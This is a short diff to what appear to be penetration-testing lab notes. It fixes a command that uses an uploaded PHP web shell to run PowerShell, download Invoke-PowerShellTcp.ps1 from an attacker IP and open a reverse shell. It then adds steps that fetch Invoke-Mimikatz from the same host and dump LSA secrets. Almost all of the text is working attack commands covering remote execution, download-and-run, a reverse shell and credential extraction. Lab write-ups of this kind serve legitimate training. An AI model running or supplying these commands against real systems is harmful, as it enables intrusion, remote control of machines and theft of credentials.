@@ -1465,6 +1465,11 @@ https://fms-defcorphq.msappproxy.net/dist/uploads/student100shell.phtml?cmd=whoa
 
 lets do a revshell with this RCE:
 ```
-https://fms-defcorphq.msappproxy.net/dist/uploads/studentxshell.phtml?cmd=powershell iex (New-Object Net.Webclient).downloadstring('http://172.161.52.213:82/Invoke-PowerShellTcp.ps1');Power -Reverse -IPAddress 172.16.152.213 -Port 4444
+https://fms-defcorphq.msappproxy.net/dist/uploads/studentxshell.phtml?cmd=powershell iex (New-Object Net.Webclient).downloadstring('http://172.16.152.213:82/Invoke-PowerShellTcp.ps1');Power -Reverse -IPAddress 172.16.152.213 -Port 4444
 ```
 
+Once we have a shell we can pull down mimikatz and extract credentials:
+```
+iex (New-Object Net.Webclient).DownloadString("http://172.16.152.213:82/Invoke-Mimikatz.ps1") 
+Invoke-Mimikatz -Command '"token::elevate" "lsadump::secrets"'
+```
